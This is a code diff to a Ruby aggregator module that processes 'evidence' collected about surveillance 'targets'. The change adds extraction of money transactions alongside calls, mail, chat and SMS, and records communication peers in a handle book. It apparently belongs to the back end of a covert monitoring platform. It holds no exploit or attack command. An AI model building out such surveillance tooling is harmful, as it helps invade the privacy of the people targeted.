@@ -12,6 +12,7 @@ require 'fileutils'
 require_relative 'peer'
 require_relative 'position'
 require_relative 'virtual'
+require_relative 'money'
 
 module RCS
 module Aggregator
@@ -62,12 +63,10 @@ class Processor
     ev = Evidence.target(entry['target_id']).find(entry['evidence_id'])
     target = Item.find(entry['target_id'])
 
-    trace :info, "Processing #{ev.type} for target #{target.name}"
+    trace :info, "Processing #{ev.type} evidence for target #{target.name.inspect}"
 
     # extract peer(s) from call, mail, chat, sms
     data = extract_data(entry['target_id'], ev)
-
-    trace :debug, ev.data.inspect
 
     data.each do |datum|
       # already exist?
@@ -123,14 +122,17 @@ class Processor
 
   def self.aggregate_peer(datum, entry, params)
     # pass the peer to the Frequencer to check if a new suggested entity has to be created
-    PeerAggregator.create_suggested_peer(entry['target_id'], params) if check_intelligence_license
+    if params[:ev_type] != 'money' and check_intelligence_license
+      PeerAggregator.create_suggested_peer(entry['target_id'], params)
+    end
 
     # find the existing aggregate or create a new one
     agg = Aggregate.target(entry['target_id']).find_or_create_by(params)
 
-    # if it's new, add the entry to the summary and notify the intelligence
+    # if it's new, add the entry to the handle book and notify the intelligence
     if agg.count == 0
-      Aggregate.target(entry['target_id']).add_to_summary(params[:type], datum[:peer])
+      HandleBook.insert_or_update(params[:type], datum[:peer], entry['target_id'])
+
       agg.add_to_intelligence_queue if check_intelligence_license
     end
 
@@ -155,6 +157,9 @@ class Processor
     data = []
 
     case ev.type
+      when 'money'
+        data += MoneyAggregator.extract_tx(ev)
+
       when 'call'
         data += PeerAggregator.extract_call(ev)
 
